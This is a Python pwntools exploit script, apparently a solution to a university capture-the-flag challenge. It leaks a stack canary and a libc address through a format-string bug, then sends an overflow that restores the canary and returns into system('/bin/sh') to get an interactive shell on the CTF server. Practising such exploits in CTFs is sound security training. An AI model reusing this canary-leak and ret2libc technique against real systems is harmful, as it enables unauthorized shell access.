#!/usr/bin/python3
from pwn import *

system_offset = 0xf7dd1150 - 0xf7daa519
bin_sh_str_offset = 0xf7f460f5 - 0xf7daa519

DEBUG = False   

if DEBUG:
    r = process('./program')
    pause()
else:
    r = remote('ctf-fsi.fe.up.pt', 4002)

r.recvuntil(b">")
r.sendline(b"e")

r.recvuntil(b":")
r.sendline(b"%8$p_%11$p")

addresses = r.recvline()
r.recvuntil(b":")

canary = int((str(addresses)).split('_')[0][3:], 16)
returnFunction = int((str(addresses)).split('_')[1][:-3], 16)

r.sendline(b"ola")
r.recvuntil(b">")
r.sendline(b"e")
r.recvuntil(b":")

content = ("a" * 20).encode('latin-1') + canary.to_bytes(4,byteorder='little') + (8 * "a").encode('latin-1') + (returnFunction + system_offset).to_bytes(4,byteorder='little') + returnFunction.to_bytes(4,byteorder='little') + (returnFunction + bin_sh_str_offset).to_bytes(4,byteorder='little')
r.sendline(content)

r.recvuntil(b":")

r.sendline(b"msg")

r.recvuntil(b">")
r.sendline(b"q")

r.interactive()
